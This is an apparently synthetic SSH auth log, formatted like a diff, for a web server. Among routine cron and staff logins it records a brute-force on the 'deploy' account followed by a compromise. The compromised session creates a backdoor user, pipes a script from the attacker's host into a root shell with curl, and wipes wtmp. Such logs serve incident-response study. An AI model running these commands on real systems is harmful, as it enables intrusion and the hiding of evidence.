+Mar 14 09:05:45 web01 sshd[6625]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 09:06:00 web01 sshd[5566]: Invalid user user from 198.51.100.105 port 32820
+Mar 14 09:06:00 web01 sshd[5566]: Failed password for invalid user user from 198.51.100.105 port 32820 ssh2
+Mar 14 09:06:05 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 09:08:45 web01 sshd[6625]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 09:10:01 web01 CRON[56826]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 09:10:02 web01 CRON[56826]: pam_unix(cron:session): session closed for user root
+Mar 14 09:10:54 web01 sshd[42815]: Invalid user ubuntu from 198.51.100.105 port 41361
+Mar 14 09:10:54 web01 sshd[42815]: Failed password for invalid user ubuntu from 198.51.100.105 port 41361 ssh2
+Mar 14 09:12:00 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+Mar 14 09:12:00 web01 sshd[29728]: Invalid user oracle from 198.51.100.105 port 33671
+Mar 14 09:12:00 web01 sshd[29728]: Failed password for invalid user oracle from 198.51.100.105 port 33671 ssh2
+Mar 14 09:14:00 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/nginx/error.log
+Mar 14 09:14:18 web01 sshd[38235]: Invalid user user from 198.51.100.105 port 40060
+Mar 14 09:14:18 web01 sshd[38235]: Failed password for invalid user user from 198.51.100.105 port 40060 ssh2
+Mar 14 09:18:20 web01 sshd[16535]: pam_unix(sshd:session): session closed for user bob
+Mar 14 09:20:01 web01 CRON[21560]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 09:20:02 web01 CRON[21560]: pam_unix(cron:session): session closed for user root
+Mar 14 09:24:00 web01 sshd[29063]: Invalid user ubuntu from 192.0.2.139 port 49050
+Mar 14 09:24:00 web01 sshd[29063]: Failed password for invalid user ubuntu from 192.0.2.139 port 49050 ssh2
+Mar 14 09:30:01 web01 CRON[45516]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 09:30:02 web01 CRON[45516]: pam_unix(cron:session): session closed for user root
+Mar 14 09:35:50 web01 sshd[47622]: Accepted publickey for carlos from 10.0.1.37 port 60380 ssh2
+Mar 14 09:35:50 web01 sshd[47622]: pam_unix(sshd:session): session opened for user carlos(uid=1003) by (uid=0)
+Mar 14 09:40:01 web01 CRON[46255]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 09:40:02 web01 CRON[46255]: pam_unix(cron:session): session closed for user root
+Mar 14 09:50:01 web01 CRON[61409]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 09:50:02 web01 CRON[61409]: pam_unix(cron:session): session closed for user root
+Mar 14 10:00:01 web01 CRON[60971]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 10:00:02 web01 CRON[60971]: pam_unix(cron:session): session closed for user root
+Mar 14 10:03:00 web01 sudo:    bob : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Mar 14 10:05:02 web01 sshd[44067]: Accepted publickey for bob from 10.0.1.22 port 54947 ssh2
+Mar 14 10:05:02 web01 sshd[44067]: pam_unix(sshd:session): session opened for user bob(uid=1002) by (uid=0)
+Mar 14 10:05:21 web01 sshd[6622]: Accepted publickey for deploy from 10.0.5.10 port 60334 ssh2
+Mar 14 10:05:21 web01 sshd[6622]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 10:05:41 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 10:06:00 web01 sshd[17684]: Invalid user ubuntu from 198.51.100.27 port 46545
+Mar 14 10:06:00 web01 sshd[17684]: Failed password for invalid user ubuntu from 198.51.100.27 port 46545 ssh2
+Mar 14 10:08:10 web01 sshd[43090]: Invalid user oracle from 198.51.100.27 port 50496
+Mar 14 10:08:10 web01 sshd[43090]: Failed password for invalid user oracle from 198.51.100.27 port 50496 ssh2
+Mar 14 10:09:04 web01 sshd[23302]: Invalid user pi from 198.51.100.27 port 55337
+Mar 14 10:09:04 web01 sshd[23302]: Failed password for invalid user pi from 198.51.100.27 port 55337 ssh2
+Mar 14 10:10:01 web01 CRON[40622]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 10:10:02 web01 CRON[40622]: pam_unix(cron:session): session closed for user root
+Mar 14 10:20:01 web01 CRON[30960]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 10:20:02 web01 CRON[30960]: pam_unix(cron:session): session closed for user root
+Mar 14 10:20:50 web01 sshd[47622]: pam_unix(sshd:session): session closed for user carlos
+Mar 14 10:30:01 web01 CRON[40545]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 10:30:02 web01 CRON[40545]: pam_unix(cron:session): session closed for user root
+Mar 14 10:34:00 web01 sshd[28673]: Invalid user oracle from 192.0.2.33 port 53132
+Mar 14 10:34:00 web01 sshd[28673]: Failed password for invalid user oracle from 192.0.2.33 port 53132 ssh2
+Mar 14 10:34:22 web01 sshd[5377]: Accepted publickey for alice from 10.0.1.15 port 55992 ssh2
+Mar 14 10:34:22 web01 sshd[5377]: pam_unix(sshd:session): session opened for user alice(uid=1001) by (uid=0)
+Mar 14 10:40:01 web01 CRON[18357]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 10:40:02 web01 CRON[18357]: pam_unix(cron:session): session closed for user root
+Mar 14 10:43:21 web01 sshd[6622]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 10:50:01 web01 CRON[53690]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 10:50:02 web01 CRON[53690]: pam_unix(cron:session): session closed for user root
+Mar 14 10:53:22 web01 sshd[5377]: pam_unix(sshd:session): session closed for user alice
+Mar 14 11:00:01 web01 CRON[14171]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 11:00:02 web01 CRON[14171]: pam_unix(cron:session): session closed for user root
+Mar 14 11:05:31 web01 sshd[35548]: Accepted publickey for deploy from 10.0.5.10 port 59622 ssh2
+Mar 14 11:05:31 web01 sshd[35548]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 11:05:51 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 11:10:01 web01 CRON[36897]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 11:10:02 web01 CRON[36897]: pam_unix(cron:session): session closed for user root
+Mar 14 11:18:00 web01 sshd[42246]: Invalid user test from 198.51.100.218 port 33868
+Mar 14 11:18:00 web01 sshd[42246]: Failed password for invalid user test from 198.51.100.218 port 33868 ssh2
+Mar 14 11:19:17 web01 sshd[15027]: Invalid user test from 198.51.100.218 port 55391
+Mar 14 11:19:17 web01 sshd[15027]: Failed password for invalid user test from 198.51.100.218 port 55391 ssh2
+Mar 14 11:20:01 web01 CRON[5410]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 11:20:02 web01 CRON[5410]: pam_unix(cron:session): session closed for user root
+Mar 14 11:22:34 web01 sshd[13612]: Invalid user test from 198.51.100.218 port 49339
+Mar 14 11:22:34 web01 sshd[13612]: Failed password for invalid user test from 198.51.100.218 port 49339 ssh2
+Mar 14 11:30:00 web01 sshd[43453]: Accepted publickey for root from 10.0.1.15 port 34154 ssh2
+Mar 14 11:30:00 web01 sshd[43453]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 11:30:01 web01 CRON[42834]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 11:30:02 web01 CRON[42834]: pam_unix(cron:session): session closed for user root
+Mar 14 11:30:02 web01 sshd[44067]: pam_unix(sshd:session): session closed for user bob
+Mar 14 11:40:01 web01 CRON[35435]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 11:40:02 web01 CRON[35435]: pam_unix(cron:session): session closed for user root
+Mar 14 11:50:01 web01 CRON[64536]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 11:50:02 web01 CRON[64536]: pam_unix(cron:session): session closed for user root
+Mar 14 11:55:07 web01 sshd[29153]: Accepted publickey for carlos from 10.0.1.37 port 50882 ssh2
+Mar 14 11:55:07 web01 sshd[29153]: pam_unix(sshd:session): session opened for user carlos(uid=1003) by (uid=0)
+Mar 14 11:55:46 web01 sshd[13748]: Accepted publickey for carlos from 10.0.1.37 port 59047 ssh2
+Mar 14 11:55:46 web01 sshd[13748]: pam_unix(sshd:session): session opened for user carlos(uid=1003) by (uid=0)
+Mar 14 12:00:01 web01 CRON[41545]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 12:00:02 web01 CRON[41545]: pam_unix(cron:session): session closed for user root
+Mar 14 12:05:24 web01 sshd[10144]: Accepted publickey for deploy from 10.0.5.10 port 33985 ssh2
+Mar 14 12:05:24 web01 sshd[10144]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 12:05:44 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 12:10:01 web01 CRON[64555]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 12:10:02 web01 CRON[64555]: pam_unix(cron:session): session closed for user root
+Mar 14 12:16:14 web01 sshd[40740]: Accepted publickey for bob from 10.0.1.22 port 56261 ssh2
+Mar 14 12:16:14 web01 sshd[40740]: pam_unix(sshd:session): session opened for user bob(uid=1002) by (uid=0)
+Mar 14 12:17:58 web01 sshd[49567]: Accepted publickey for bob from 10.0.1.22 port 37865 ssh2
+Mar 14 12:17:58 web01 sshd[49567]: pam_unix(sshd:session): session opened for user bob(uid=1002) by (uid=0)
+Mar 14 12:20:01 web01 CRON[38833]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 12:20:02 web01 CRON[38833]: pam_unix(cron:session): session closed for user root
+Mar 14 12:24:14 web01 sshd[40740]: pam_unix(sshd:session): session closed for user bob
+Mar 14 12:24:31 web01 sshd[35548]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 12:27:58 web01 sshd[49567]: pam_unix(sshd:session): session closed for user bob
+Mar 14 12:30:01 web01 CRON[51692]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 12:30:02 web01 CRON[51692]: pam_unix(cron:session): session closed for user root
+Mar 14 12:30:07 web01 sshd[29153]: pam_unix(sshd:session): session closed for user carlos
+Mar 14 12:40:01 web01 CRON[3875]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 12:40:02 web01 CRON[3875]: pam_unix(cron:session): session closed for user root
+Mar 14 12:46:00 web01 sshd[12385]: Invalid user user from 198.51.100.211 port 33161
+Mar 14 12:46:00 web01 sshd[12385]: Failed password for invalid user user from 198.51.100.211 port 33161 ssh2
+Mar 14 12:49:48 web01 sshd[13420]: Invalid user user from 198.51.100.211 port 35175
+Mar 14 12:49:48 web01 sshd[13420]: Failed password for invalid user user from 198.51.100.211 port 35175 ssh2
+Mar 14 12:50:01 web01 CRON[5734]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 12:50:02 web01 CRON[5734]: pam_unix(cron:session): session closed for user root
+Mar 14 12:50:34 web01 sshd[64404]: Invalid user test from 198.51.100.211 port 54875
+Mar 14 12:50:34 web01 sshd[64404]: Failed password for invalid user test from 198.51.100.211 port 54875 ssh2
+Mar 14 12:53:00 web01 sshd[43453]: pam_unix(sshd:session): session closed for user root
+Mar 14 12:57:51 web01 sshd[13391]: Invalid user test from 198.51.100.211 port 35655
+Mar 14 12:57:51 web01 sshd[13391]: Failed password for invalid user test from 198.51.100.211 port 35655 ssh2
+Mar 14 13:00:01 web01 CRON[27703]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 13:00:02 web01 CRON[27703]: pam_unix(cron:session): session closed for user root
+Mar 14 13:05:37 web01 sshd[25824]: Accepted publickey for deploy from 10.0.5.10 port 39175 ssh2
+Mar 14 13:05:37 web01 sshd[25824]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 13:05:57 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 13:10:01 web01 CRON[64078]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 13:10:02 web01 CRON[64078]: pam_unix(cron:session): session closed for user root
+Mar 14 13:12:24 web01 sshd[10144]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 13:17:46 web01 sshd[13748]: pam_unix(sshd:session): session closed for user carlos
+Mar 14 13:20:01 web01 CRON[43789]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 13:20:02 web01 CRON[43789]: pam_unix(cron:session): session closed for user root
+Mar 14 13:30:01 web01 CRON[60106]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 13:30:02 web01 CRON[60106]: pam_unix(cron:session): session closed for user root
+Mar 14 13:37:00 web01 sshd[1281]: Invalid user test from 192.0.2.110 port 55917
+Mar 14 13:37:00 web01 sshd[1281]: Failed password for invalid user test from 192.0.2.110 port 55917 ssh2
+Mar 14 13:37:12 web01 sshd[36687]: Failed password for deploy from 203.0.113.77 port 37450 ssh2
+Mar 14 13:37:20 web01 sshd[12523]: Failed password for deploy from 203.0.113.77 port 41335 ssh2
+Mar 14 13:37:24 web01 sshd[16252]: Failed password for deploy from 203.0.113.77 port 57807 ssh2
+Mar 14 13:37:31 web01 sshd[35874]: Failed password for deploy from 203.0.113.77 port 42984 ssh2
+Mar 14 13:37:35 web01 sshd[49374]: Failed password for deploy from 203.0.113.77 port 35592 ssh2
+Mar 14 13:37:42 web01 sshd[29508]: Failed password for deploy from 203.0.113.77 port 40821 ssh2
+Mar 14 13:37:48 web01 sshd[37102]: Failed password for deploy from 203.0.113.77 port 53561 ssh2
+Mar 14 13:37:56 web01 sshd[27865]: Failed password for deploy from 203.0.113.77 port 55599 ssh2
+Mar 14 13:38:02 web01 sshd[16235]: Failed password for deploy from 203.0.113.77 port 50811 ssh2
+Mar 14 13:38:08 web01 sshd[13895]: Failed password for deploy from 203.0.113.77 port 35211 ssh2
+Mar 14 13:38:13 web01 sshd[16282]: Failed password for deploy from 203.0.113.77 port 43339 ssh2
+Mar 14 13:38:21 web01 sshd[8315]: Failed password for deploy from 203.0.113.77 port 50233 ssh2
+Mar 14 13:38:25 web01 sshd[64278]: Failed password for deploy from 203.0.113.77 port 46222 ssh2
+Mar 14 13:38:29 web01 sshd[9544]: Failed password for deploy from 203.0.113.77 port 37921 ssh2
+Mar 14 13:38:35 web01 sshd[58413]: Failed password for deploy from 203.0.113.77 port 33923 ssh2
+Mar 14 13:38:40 web01 sshd[17021]: Failed password for deploy from 203.0.113.77 port 46201 ssh2
+Mar 14 13:38:45 web01 sshd[53032]: Failed password for deploy from 203.0.113.77 port 57507 ssh2
+Mar 14 13:38:52 web01 sshd[8360]: Failed password for deploy from 203.0.113.77 port 40746 ssh2
+Mar 14 13:39:00 web01 sshd[15530]: Failed password for deploy from 203.0.113.77 port 40096 ssh2
+Mar 14 13:39:08 web01 sshd[21665]: Failed password for deploy from 203.0.113.77 port 57095 ssh2
+Mar 14 13:39:14 web01 sshd[20886]: Failed password for deploy from 203.0.113.77 port 40559 ssh2
+Mar 14 13:39:21 web01 sshd[22258]: Failed password for deploy from 203.0.113.77 port 59287 ssh2
+Mar 14 13:39:25 web01 sshd[57368]: Failed password for deploy from 203.0.113.77 port 34009 ssh2
+Mar 14 13:39:29 web01 sshd[63669]: Failed password for deploy from 203.0.113.77 port 46235 ssh2
+Mar 14 13:39:36 web01 sshd[6388]: Failed password for deploy from 203.0.113.77 port 53673 ssh2
+Mar 14 13:39:40 web01 sshd[34533]: Failed password for deploy from 203.0.113.77 port 57904 ssh2
+Mar 14 13:39:44 web01 sshd[42204]: Failed password for deploy from 203.0.113.77 port 51178 ssh2
+Mar 14 13:39:50 web01 sshd[48713]: Failed password for deploy from 203.0.113.77 port 38177 ssh2
+Mar 14 13:39:57 web01 sshd[37582]: Failed password for deploy from 203.0.113.77 port 47709 ssh2
+Mar 14 13:40:01 web01 CRON[41615]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 13:40:02 web01 CRON[41615]: pam_unix(cron:session): session closed for user root
+Mar 14 13:40:04 web01 sshd[47429]: Failed password for deploy from 203.0.113.77 port 41816 ssh2
+Mar 14 13:40:08 web01 sshd[44879]: Failed password for deploy from 203.0.113.77 port 32837 ssh2
+Mar 14 13:40:13 web01 sshd[55205]: Failed password for deploy from 203.0.113.77 port 43091 ssh2
+Mar 14 13:40:18 web01 sshd[23422]: Failed password for deploy from 203.0.113.77 port 59416 ssh2
+Mar 14 13:40:26 web01 sshd[58487]: Failed password for deploy from 203.0.113.77 port 57726 ssh2
+Mar 14 13:40:30 web01 sshd[32335]: Failed password for deploy from 203.0.113.77 port 37277 ssh2
+Mar 14 13:40:35 web01 sshd[50636]: Failed password for deploy from 203.0.113.77 port 40965 ssh2
+Mar 14 13:40:39 web01 sshd[56788]: Failed password for deploy from 203.0.113.77 port 37624 ssh2
+Mar 14 13:40:45 web01 sshd[56775]: Failed password for deploy from 203.0.113.77 port 59967 ssh2
+Mar 14 13:41:20 web01 sshd[29660]: Accepted password for deploy from 203.0.113.77 port 41375 ssh2
+Mar 14 13:41:20 web01 sshd[29660]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 13:43:20 web01 sudo:    deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+Mar 14 13:44:20 web01 useradd[33482]: new group: name=sysbackup, GID=1005
+Mar 14 13:44:21 web01 useradd[24470]: new user: name=sysbackup, UID=1005, GID=1005, home=/home/sysbackup, shell=/bin/bash, from=/dev/pts/1
+Mar 14 13:45:20 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/sh -c curl -s http://203.0.113.77/x.sh | sh
+Mar 14 13:46:00 web01 sshd[47750]: Invalid user admin from 192.0.2.189 port 39864
+Mar 14 13:46:00 web01 sshd[47750]: Failed password for invalid user admin from 192.0.2.189 port 39864 ssh2
+Mar 14 13:47:20 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /var/log/wtmp
+Mar 14 13:50:01 web01 CRON[4527]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 13:50:02 web01 CRON[4527]: pam_unix(cron:session): session closed for user root
+Mar 14 13:50:51 web01 sshd[44379]: Invalid user admin from 192.0.2.189 port 34628
+Mar 14 13:50:51 web01 sshd[44379]: Failed password for invalid user admin from 192.0.2.189 port 34628 ssh2
+Mar 14 13:51:00 web01 sshd[52918]: Invalid user ubuntu from 192.0.2.120 port 53419
+Mar 14 13:51:00 web01 sshd[52918]: Failed password for invalid user ubuntu from 192.0.2.120 port 53419 ssh2
+Mar 14 13:52:12 web01 sshd[52444]: Invalid user pi from 192.0.2.120 port 38335
+Mar 14 13:52:12 web01 sshd[52444]: Failed password for invalid user pi from 192.0.2.120 port 38335 ssh2
+Mar 14 13:53:02 web01 sshd[48038]: Failed password for root from 192.0.2.120 port 33270 ssh2
+Mar 14 13:59:39 web01 sshd[42301]: Invalid user ubuntu from 192.0.2.120 port 54382
+Mar 14 13:59:39 web01 sshd[42301]: Failed password for invalid user ubuntu from 192.0.2.120 port 54382 ssh2
+Mar 14 14:00:01 web01 CRON[45276]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 14:00:02 web01 CRON[45276]: pam_unix(cron:session): session closed for user root
+Mar 14 14:05:28 web01 sshd[8450]: Accepted publickey for deploy from 10.0.5.10 port 54624 ssh2
+Mar 14 14:05:28 web01 sshd[8450]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 14:05:48 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 14:10:01 web01 CRON[2123]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 14:10:02 web01 CRON[2123]: pam_unix(cron:session): session closed for user root
+Mar 14 14:20:01 web01 CRON[42615]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 14:20:02 web01 CRON[42615]: pam_unix(cron:session): session closed for user root
+Mar 14 14:20:21 web01 sshd[23760]: Accepted publickey for bob from 10.0.1.22 port 45234 ssh2
+Mar 14 14:20:21 web01 sshd[23760]: pam_unix(sshd:session): session opened for user bob(uid=1002) by (uid=0)
+Mar 14 14:29:37 web01 sshd[25824]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 14:30:01 web01 CRON[13898]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 14:30:02 web01 CRON[13898]: pam_unix(cron:session): session closed for user root
+Mar 14 14:31:21 web01 sshd[23760]: pam_unix(sshd:session): session closed for user bob
+Mar 14 14:36:20 web01 sshd[29660]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 14:39:28 web01 sshd[8450]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 14:40:01 web01 CRON[13912]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 14:40:02 web01 CRON[13912]: pam_unix(cron:session): session closed for user root
+Mar 14 14:50:01 web01 CRON[7854]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 14:50:02 web01 CRON[7854]: pam_unix(cron:session): session closed for user root
+Mar 14 15:00:01 web01 CRON[19672]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 15:00:02 web01 CRON[19672]: pam_unix(cron:session): session closed for user root
+Mar 14 15:05:19 web01 sshd[4424]: Accepted publickey for deploy from 10.0.5.10 port 48878 ssh2
+Mar 14 15:05:19 web01 sshd[4424]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 15:05:39 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 15:10:01 web01 CRON[13882]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 15:10:02 web01 CRON[13882]: pam_unix(cron:session): session closed for user root
+Mar 14 15:10:25 web01 sshd[13551]: Accepted publickey for carlos from 10.0.1.37 port 37228 ssh2
+Mar 14 15:10:25 web01 sshd[13551]: pam_unix(sshd:session): session opened for user carlos(uid=1003) by (uid=0)
+Mar 14 15:20:01 web01 CRON[30643]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 15:20:02 web01 CRON[30643]: pam_unix(cron:session): session closed for user root
+Mar 14 15:20:49 web01 sshd[53323]: Accepted publickey for alice from 10.0.1.15 port 51412 ssh2
+Mar 14 15:20:49 web01 sshd[53323]: pam_unix(sshd:session): session opened for user alice(uid=1001) by (uid=0)
+Mar 14 15:30:01 web01 CRON[50093]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 15:30:02 web01 CRON[50093]: pam_unix(cron:session): session closed for user root
+Mar 14 15:35:19 web01 sshd[4424]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 15:40:01 web01 CRON[61065]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 15:40:02 web01 CRON[61065]: pam_unix(cron:session): session closed for user root
+Mar 14 15:50:01 web01 CRON[53313]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 15:50:02 web01 CRON[53313]: pam_unix(cron:session): session closed for user root
+Mar 14 16:00:01 web01 CRON[38268]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 16:00:02 web01 CRON[38268]: pam_unix(cron:session): session closed for user root
+Mar 14 16:05:22 web01 sshd[36059]: Accepted publickey for deploy from 10.0.5.10 port 43528 ssh2
+Mar 14 16:05:22 web01 sshd[36059]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 16:05:42 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 16:10:01 web01 CRON[21596]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 16:10:02 web01 CRON[21596]: pam_unix(cron:session): session closed for user root
+Mar 14 16:11:59 web01 sshd[13574]: Accepted publickey for alice from 10.0.1.15 port 47168 ssh2
+Mar 14 16:11:59 web01 sshd[13574]: pam_unix(sshd:session): session opened for user alice(uid=1001) by (uid=0)
+Mar 14 16:14:25 web01 sshd[13551]: pam_unix(sshd:session): session closed for user carlos
+Mar 14 16:20:01 web01 CRON[1816]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 16:20:02 web01 CRON[1816]: pam_unix(cron:session): session closed for user root
+Mar 14 16:20:06 web01 sshd[58513]: Accepted publickey for alice from 10.0.1.15 port 34525 ssh2
+Mar 14 16:20:06 web01 sshd[58513]: pam_unix(sshd:session): session opened for user alice(uid=1001) by (uid=0)
+Mar 14 16:30:01 web01 CRON[53127]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 16:30:02 web01 CRON[53127]: pam_unix(cron:session): session closed for user root
+Mar 14 16:40:00 web01 sudo:    carlos : TTY=pts/0 ; PWD=/home/carlos ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Mar 14 16:40:01 web01 CRON[62398]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 16:40:02 web01 CRON[62398]: pam_unix(cron:session): session closed for user root
+Mar 14 16:43:22 web01 sshd[36059]: pam_unix(sshd:session): session closed for user deploy
+Mar 14 16:45:49 web01 sshd[53323]: pam_unix(sshd:session): session closed for user alice
+Mar 14 16:50:01 web01 CRON[41028]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 16:50:02 web01 CRON[41028]: pam_unix(cron:session): session closed for user root
+Mar 14 16:55:00 web01 sshd[45266]: Invalid user admin from 192.0.2.237 port 54052
+Mar 14 16:55:00 web01 sshd[45266]: Failed password for invalid user admin from 192.0.2.237 port 54052 ssh2
+Mar 14 16:56:27 web01 sshd[34692]: Invalid user test from 192.0.2.237 port 42168
+Mar 14 16:56:27 web01 sshd[34692]: Failed password for invalid user test from 192.0.2.237 port 42168 ssh2
+Mar 14 17:00:01 web01 CRON[22862]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 17:00:02 web01 CRON[22862]: pam_unix(cron:session): session closed for user root
+Mar 14 17:01:56 web01 sshd[52579]: Invalid user admin from 192.0.2.237 port 34498
+Mar 14 17:01:56 web01 sshd[52579]: Failed password for invalid user admin from 192.0.2.237 port 34498 ssh2
+Mar 14 17:05:00 web01 sshd[36429]: Invalid user ubuntu from 192.0.2.215 port 59976
+Mar 14 17:05:00 web01 sshd[36429]: Failed password for invalid user ubuntu from 192.0.2.215 port 59976 ssh2
+Mar 14 17:05:37 web01 sshd[64522]: Accepted publickey for deploy from 10.0.5.10 port 36141 ssh2
+Mar 14 17:05:37 web01 sshd[64522]: pam_unix(sshd:session): session opened for user deploy(uid=1010) by (uid=0)
+Mar 14 17:05:57 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shopfront
+Mar 14 17:09:14 web01 sshd[17812]: Invalid user ubuntu from 192.0.2.215 port 36205
+Mar 14 17:09:14 web01 sshd[17812]: Failed password for invalid user ubuntu from 192.0.2.215 port 36205 ssh2
+Mar 14 17:10:01 web01 CRON[29322]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 17:10:02 web01 CRON[29322]: pam_unix(cron:session): session closed for user root
+Mar 14 17:13:12 web01 sshd[19723]: Invalid user ubuntu from 192.0.2.215 port 36518
+Mar 14 17:13:12 web01 sshd[19723]: Failed password for invalid user ubuntu from 192.0.2.215 port 36518 ssh2
+Mar 14 17:17:44 web01 sshd[62234]: Accepted publickey for carlos from 10.0.1.37 port 37981 ssh2
+Mar 14 17:17:44 web01 sshd[62234]: pam_unix(sshd:session): session opened for user carlos(uid=1003) by (uid=0)
+Mar 14 17:20:01 web01 CRON[38493]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Mar 14 17:20:02 web01 CRON[38493]: pam_unix(cron:session): session closed for user root
+Mar 14 17:23:59 web01 sshd[13574]: pam_unix(sshd:session): session closed for user alice
+Mar 14 17:26:00 web01 sshd[49856]: Failed password for root from 192.0.2.145 port 44950 ssh2
+Mar 14 17:26:36 web01 sshd[10483]: Failed password for root from 192.0.2.145 port 37557 ssh2
+Mar 14 17:28:30 web01 sshd[15946]: Failed password for root from 192.0.2.145 port 59055 ssh2
+Mar 14 17:28:42 web01 sshd[60220]: Accepted publickey for alice from 10.0.1.15 port 38342 ssh2
